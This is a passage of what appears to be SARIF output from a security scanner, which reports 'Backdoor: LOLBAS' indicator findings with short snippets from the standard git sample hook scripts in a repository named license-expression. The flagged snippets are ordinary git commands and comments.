                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 18,
                  "endLine": 14,
                  "endColumn": 24,
                  "snippet": {
                    "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                    "rendered": {
                      "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                      "markdown": "`then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 25,
                  "endLine": 10,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 2,
                  "endLine": 10,
                  "endColumn": 7,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 45,
                  "endLine": 161,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                    "rendered": {
                      "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                      "markdown": "`\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 29,
                  "endLine": 151,
                  "endColumn": 33,
                  "snippet": {
                    "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                    "rendered": {
                      "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                      "markdown": "` * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 10,
                  "endLine": 131,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                    "rendered": {
                      "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                      "markdown": "`    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 61,
                  "endLine": 104,
                  "snippet": {
                    "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                    "rendered": {
                      "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                      "markdown": "`\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 165,
                  "endLine": 165,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                    "rendered": {
                      "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                      "markdown": "`\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 159,
                  "endLine": 159,
                  "endColumn": 5,
                  "snippet": {
                    "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                    "rendered": {
                      "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                      "markdown": "`To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 158,
                  "endLine": 158,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                    "rendered": {
                      "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                      "markdown": "`\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 12,
                  "endLine": 125,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                    "rendered": {
                      "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                      "markdown": "`\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 42,
                  "endLine": 102,
                  "endColumn": 47,
                  "snippet": {
                    "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                    "rendered": {
                      "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                      "markdown": "`   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 30,
                  "endLine": 40,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                      "markdown": "`# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 4,
                  "endLine": 37,
                  "endColumn": 9,
                  "snippet": {
                    "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                    "rendered": {
                      "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                      "markdown": "`esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 48,
                  "endLine": 26,
                  "snippet": {
                    "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                    "rendered": {
                      "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                      "markdown": "`\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 18,
                  "endLine": 21,
                  "endColumn": 23,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 8,
                  "endLine": 21,
                  "endColumn": 14,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 1,
                  "endLine": 21,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 1,
                  "endLine": 16,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                    "rendered": {
                      "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                      "markdown": "`# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 34,
                  "endLine": 15,
                  "endColumn": 39,
                  "snippet": {
                    "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                    "rendered": {
                      "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                      "markdown": "`# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 15,
                  "endLine": 77,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 10,
                  "endLine": 7,
                  "endColumn": 18,
                  "snippet": {
                    "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                    "rendered": {
                      "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
